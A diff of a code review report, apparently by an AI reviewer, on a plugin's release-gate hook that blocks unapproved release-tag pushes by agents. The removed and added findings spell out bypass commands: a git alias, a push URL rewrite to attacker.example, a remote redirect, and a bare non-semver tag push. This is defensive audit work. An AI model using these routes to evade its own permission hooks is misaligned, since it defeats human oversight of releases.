@@ -1,27 +1,33 @@
 ---
 phase: 12-v0-6-0-release-candidate-review
-reviewed: 2026-05-23T04:08:21Z
+reviewed: 2026-05-23T08:20:20Z
 depth: deep
-files_reviewed: 64
+files_reviewed: 77
 files_reviewed_list:
+  - .claude-plugin/marketplace.json
   - .claude-plugin/plugin.json
   - .codex-plugin/plugin.json
-  - /Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json
+  - .github/workflows/ci.yml
   - CHANGELOG.md
   - README.md
   - agents/claude/codex-delegate.md
   - agents/claude/codex-delegate/SKILL.md
+  - agents/claude/codex-stop/SKILL.md
+  - agents/claude/forge-stop/SKILL.md
   - agents/claude/forge.md
   - agents/claude/forge/SKILL.md
   - agents/claude/forge:delegate/SKILL.md
   - agents/claude/kay:delegate/SKILL.md
   - agents/codex/codex-delegate.md
   - agents/codex/codex-delegate/SKILL.md
+  - agents/codex/codex-stop/SKILL.md
+  - agents/codex/forge-stop/SKILL.md
   - agents/codex/forge.md
   - agents/codex/forge/SKILL.md
   - agents/codex/forge:delegate/SKILL.md
   - agents/codex/kay:delegate/SKILL.md
   - context.md
+  - hooks/hooks.json
   - hooks/lib/sidekick-registry.sh
   - hooks/scrub-legacy-user-hooks.py
   - hooks/validate-release-gate.sh
@@ -42,9 +48,13 @@ files_reviewed_list:
   - site/help/troubleshooting/index.html
   - site/help/workflows/index.html
   - site/index.html
+  - site/internal/codex-command-packaging-guide.md
   - site/internal/pre-release-quality-gate.md
+  - site/knowledge/2026-04.md
   - site/pre-release-quality-gate.md
   - skills/codex-delegate/SKILL.md
+  - skills/codex-stop/SKILL.md
+  - skills/forge-stop/SKILL.md
   - skills/forge/SKILL.md
   - tests/post_release_cleanup.bash
   - tests/run_all.bash
@@ -57,6 +67,8 @@ files_reviewed_list:
   - tests/test_codex_enforcer_hook.bash
   - tests/test_codex_marketplace_manifest.bash
   - tests/test_codex_marketplace_release_gate.bash
+  - tests/test_codex_plugin_manifest.bash
+  - tests/test_codex_skill.bash
   - tests/test_docs_contract.bash
   - tests/test_forge_skill.bash
   - tests/test_help_site_navigation.bash
@@ -64,135 +76,103 @@ files_reviewed_list:
   - tests/test_host_surface_rewrite.bash
   - tests/test_install_sh.bash
   - tests/test_legacy_hook_scrub.bash
+  - tests/test_plugin_integrity.bash
   - tests/test_post_release_cleanup.bash
   - tests/test_repo_layout.bash
   - tests/test_runner_contract.bash
   - tests/test_validate_release_gate_hook.bash
 findings:
-  critical: 3
+  critical: 1
   warning: 2
-  info: 1
-  total: 6
+  info: 0
+  total: 3
 status: issues_found
 ---
 
 # Phase 12: Code Review Report
 
-**Reviewed:** 2026-05-23T04:08:21Z
+**Reviewed:** 2026-05-23T08:20:20Z
 **Depth:** deep
-**Files Reviewed:** 64
+**Files Reviewed:** 77
 **Status:** issues_found
 
 ## Summary
 
-Reviewed the v0.6.0 release-gate diff `origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2`, with extra inspection of the public Codex marketplace pin at `/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json`.
+Reviewed the v0.6.0 release-candidate diff `v0.5.8..aff4fc05fa39ec0e34888ceae726fbbf3a21a0ca`, with emphasis on generated host skill surfaces, strict and release runners, release-gate fail-closed behavior, plugin integrity, marketplace pinning, and release documentation consistency.
 
-The marketplace pin is current (`version=0.6.0`, `ref=a5552f2631564efc1fc782ddded06dd8f4eadfb2`) and the sampled plugin integrity hashes match the manifest. The release gate is still not release-safe: there are fail-open paths around same-command Git config/alias mutation and local ref based GitHub release target resolution.
+The generated Claude/Codex host bundles and integrity checks look internally consistent under the strict non-live suite. The release candidate is not shippable because the release hook still lets a bare non-semver tag push pass through without any pre-release or live-pyramid evidence.
 
 Verification performed:
-- `bash -n` on changed shell scripts passed.
+- `git diff --check v0.5.8..aff4fc05fa39ec0e34888ceae726fbbf3a21a0ca -- . ':!.planning/'` passed.
+- `bash -n` over changed shell scripts passed.
 - `python3 -m py_compile scripts/render-agent-bundle.py hooks/scrub-legacy-user-hooks.py` passed.
-- `git diff --check origin/main..a5552f2631564efc1fc782ddded06dd8f4eadfb2` passed.
-- `bash tests/test_validate_release_gate_hook.bash` passed (`388 passed, 0 failed`), but one passing scenario encodes a stale-tag behavior that violates the release requirement.
-- `CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash` failed because the checkout is dirty (`?? ~/`).
+- `bash tests/run_unit.bash` passed all strict non-live suites, including 439 release-gate hook scenarios.
+- Targeted hook probe for `git tag release-candidate HEAD && git push origin release-candidate` returned `rc=0` with no deny JSON.
+- Control probe for `git tag release-candidate HEAD && git push origin refs/tags/release-candidate` returned a `permissionDecision=deny` JSON.
+- `SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash` failed because `git status --porcelain` reports `?? ~/`.
 
 ## Narrative Findings (AI reviewer)
 
 ## Critical Issues
 
-### CR-01: Same-command Git alias config bypasses the release hook entirely
+### CR-01: Bare non-semver tag pushes bypass the release gate
 
-**File:** `hooks/validate-release-gate.sh:4109`
+**File:** `hooks/validate-release-gate.sh:1221`
 
-**Issue:** Git alias expansion is checked only from persistent aliases and command-scoped `git -c alias.*` values. A same-command alias written through `git config alias.*` is not classified as a release command before the later alias invocation. A command shaped like:
+**Issue:** `token_is_release_tag_ref` only treats `refs/tags/*` and semver-shaped tokens as release tag refs. `refspec_targets_release_tag` then returns false for any static unqualified non-semver refspec, and `git_push_release_tag_command` allows the command to pass. The mirrored metadata parser has the same semver-only assumption at `hooks/validate-release-gate.sh:4756`, `hooks/validate-release-gate.sh:4776`, and `hooks/validate-release-gate.sh:5684`.
 
-```bash
-git config alias.ship 'push origin HEAD:refs/tags/v1.2.1' && git ship
-```
-
-publishes a release tag when executed, but the hook currently emits no deny decision even with no quality-gate markers.
-
-**Impact:** A release-tag publication can bypass all four stage markers and both live-pyramid markers.
-
-**Fix:** Treat `git config alias.*`, `git config --add alias.*`, and `git config --replace-all alias.*` as release-sensitive config mutations. Recursively inspect the configured alias payload; if it could publish a release tag, require the gate and mark later same-command alias execution as unresolvable. Add a regression for the command above with no markers and with valid markers.
-
-### CR-02: Same-command Git URL/remote rewrites are ignored before tag publication
-
-**File:** `hooks/validate-release-gate.sh:5617`
-
-**Issue:** Release target metadata tracks only prior `git tag` and `git update-ref` mutations. It does not track prior `git config url.*`, `git config remote.*`, or `git remote set-url` mutations in the same Bash command. With valid markers for `HEAD`, commands such as:
+This lets a real tag publication shape pass with no markers:
 
 ```bash
-git config url.https://attacker.example/alo-exp/sidekick/.pushInsteadOf https://github.com/alo-exp/sidekick &&
-git push https://github.com/alo-exp/sidekick.git HEAD:refs/tags/v1.2.1
+git tag release-candidate HEAD && git push origin release-candidate
 ```
 
-and:
+The hook emitted no deny JSON for that command. Git accepts `git push origin <tagname>` for an existing unqualified tag when the name is not ambiguous, so this bypasses the release hook's requirement that release publication only proceed against explicit current trusted Sidekick targets after the four pre-release markers and two live-pyramid markers.
+
+**Fix:** In both the classifier and metadata pass, resolve unqualified `git push` refspecs against the target checkout before deciding they are branch-safe. Treat the refspec as release-sensitive when the source or destination is `refs/tags/*`, when it resolves to `refs/tags/<name>`, or when an earlier segment in the same shell command created or updated that tag. If resolution is impossible or ambiguous, fail closed unless the refspec is explicitly `refs/heads/*` or otherwise proven branch-only. Also update `git_tag_mutates_release_ref` so mutating `git tag <name>` tracks any tag name, not only semver names.
+
+Concrete regression examples to add:
 
 ```bash
-git remote set-url --push origin https://github.com/attacker/other.git &&
-git push origin HEAD:refs/tags/v1.2.1
+assert_denied_command "git push bare non-semver tag is denied" \
+  "git tag release-candidate HEAD && git push origin release-candidate"
+
+assert_denied_command "git push bare non-semver local tag is denied" \
+  "git push origin release-candidate"
 ```
 
-pass the hook because validation reads the pre-mutation config, while actual execution rewrites the push destination.
+For the second case, seed a temp checkout with `refs/tags/release-candidate` and run the hook from that cwd. Add parallel passing coverage for an explicit branch-only push such as `git push origin refs/heads/release-candidate`.
 
-**Impact:** A command can satisfy markers for the Sidekick target SHA, then publish the tag to a different repository or host in the same shell invocation.
+## Warnings
 
-**Fix:** Maintain a `release_context_mutated` flag in the metadata pass for preceding `git config` keys under `remote.*`, `url.*`, `include.*`, `includeIf.*`, and for `git remote set-url/add/remove/rename`. If a release publication appears after such a mutation, return `unresolvable` and deny. Mirror the same guard in the classifier so unknown alias/config rewrites fail closed.
+### WR-01: The hook suite misses the bare non-semver tag form
 
-### CR-03: GitHub release target SHA is resolved from local refs, not the actual remote target
+**File:** `tests/test_validate_release_gate_hook.bash:2190`
 
-**File:** `hooks/validate-release-gate.sh:5727`
+**Issue:** The release-gate suite covers `refs/tags/release-candidate`, numeric tag refs, bare semver tags, and dynamic refspecs, but it does not cover a bare non-semver tag such as `release-candidate`. That is the exact form Git users commonly type and the exact form the hook currently lets through.
 
-**Issue:** `gh release create --verify-tag` and `gh release create --target <branch-or-tag>` are resolved by GitHub against the remote repository, but the hook resolves `metadata_value^{commit}` in the local checkout. The code therefore authorizes based on local tag/branch state that may be stale or unrelated to the remote ref GitHub will use.
+**Fix:** Add no-marker denial tests for bare non-semver local tags, same-command tag creation followed by a bare push, and env-expanded bare tag names that resolve to local tags. Keep the existing dynamic branch passthrough test, but require explicit branch evidence for non-semver unqualified names.
 
-This is also locked into the tests: `tests/test_validate_release_gate_hook.bash:2250` expects a verified GitHub release with a stale local tag to pass when markers exist for that local tag.
-
-**Impact:** Markers can be present for the wrong commit. A stale local `vX.Y.Z` tag or stale local `main` branch can authorize a GitHub release whose actual remote target SHA was never reviewed or live-tested.
-
-**Fix:** For `gh release create`, fail closed unless the target is an explicit commit SHA that resolves in a trusted Sidekick checkout, or verify symbolic targets against the allowed remote with `git ls-remote --tags/--heads origin <ref>` and require the marker SHA to match that remote object. `--verify-tag` should verify the remote tag SHA, not a local tag.
-
-## Important Issues
-
-### IM-01: Tests assert the opposite of the stale-tag fail-closed requirement
-
-**File:** `tests/test_validate_release_gate_hook.bash:2250`
-
-**Issue:** The scenario named `verified gh release stale tag passes with tag target markers` expects pass-through for a stale local tag. That contradicts the release requirement that target SHA resolution fail closed for stale local tags.
-
-**Impact:** The suite gives false confidence and will reject the correct fix unless the test is inverted.
-
-**Fix:** Change the scenario to expect `permissionDecision=deny` unless the hook verifies the remote tag SHA and the markers match that remote SHA. Add a parallel `--target main` stale-local-branch case.
-
-### IM-02: Current release-gate marketplace check fails because the checkout is dirty
+### WR-02: Current release-gate marketplace validation fails on a dirty checkout
 
 **File:** `tests/test_codex_marketplace_manifest.bash:44`
 
-**Issue:** In release-gate mode the marketplace manifest test requires a clean Sidekick checkout. Running it against the requested marketplace file failed at this check because `git status --porcelain` reports an untracked `~/` directory.
+**Issue:** Release-gate mode requires a clean Sidekick checkout before validating marketplace metadata. The current repo fails that check with:
 
-**Impact:** Even aside from the critical hook bugs, the current workspace cannot pass the release-gate marketplace validation.
+```text
+?? ~/
+```
 
-**Fix:** Remove the accidental untracked `~/` directory or explicitly commit/ignore it if it is intentional. Re-run:
+The untracked directory contains `./~/.codex/.silver-bullet/config-cache-6f1547fa77b087ac266955164f3c1379`.
+
+**Fix:** Remove the accidental untracked `~/` tree, or commit/ignore it if it is intentional. Then rerun:
 
 ```bash
-CODEX_MARKETPLACE_FILE=/Users/shafqat/projects/codex-plugins/.agents/plugins/marketplace.json \
 SIDEKICK_RELEASE_GATE=1 bash tests/test_codex_marketplace_manifest.bash
 ```
 
-## Minor Issues
-
-### MN-01: No regression covers same-command Git config mutation before release push
-
-**File:** `tests/test_validate_release_gate_hook.bash:2405`
-
-**Issue:** The suite covers command-scoped `git -c url.*` rewrites and already-persistent URL rewrites, but it does not cover same-command persistent mutations such as `git config url.* && git push` or `git remote set-url && git push`.
-
-**Impact:** The CR-02 fail-open path was able to ship despite extensive release-hook coverage.
-
-**Fix:** Add tests that seed valid current markers and still expect deny for same-command URL/remote mutation before a tag push.
-
 ---
 
-STATUS: success
-ACCEPTED_FINDINGS: 5
+STATUS: failed
+ACCEPTED_FINDINGS: 3
 ASSESSMENT: blocked
